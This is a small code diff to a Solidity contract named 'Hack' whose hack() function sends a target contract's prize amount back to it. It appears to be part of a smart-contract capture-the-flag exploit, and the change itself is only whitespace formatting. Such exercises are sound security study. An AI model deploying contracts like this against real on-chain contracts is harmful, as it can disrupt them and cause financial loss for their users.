@@ -34,7 +34,7 @@ contract Hack {
 
     function hack() public payable {
         prize = target.prize();
-        (bool success, ) = payable(address(target)).call{value: prize}("");
+        (bool success,) = payable(address(target)).call{value: prize}("");
         require(success, "Transfer failed");
     }
 }
